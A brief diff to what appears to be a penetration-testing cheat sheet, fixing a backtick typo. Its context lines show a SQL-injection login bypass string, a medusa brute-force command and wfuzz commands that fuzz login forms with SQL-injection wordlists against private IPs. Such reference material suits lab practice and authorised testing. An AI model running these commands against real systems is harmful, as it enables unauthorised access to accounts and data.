@@ -113,7 +113,7 @@ Admin' OR 1=1-- -
 
 ```medusa 10.11.1.229 -u admin -P passwords.txt -M http -m DIR:/printers -T 10```
 
-```wfuzz -u http://192.168.1.48/index.php -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "uname=admin&psw=FUZZ&btnLogin=Login"````
+```wfuzz -u http://192.168.1.48/index.php -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "uname=admin&psw=FUZZ&btnLogin=Login"```
 
 ```wfuzz --hh 109 -d "myusername=admin&mypassword=FUZZ&Submit=Login" -u "http://192.168.1.20/checklogin.php" -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt```
 
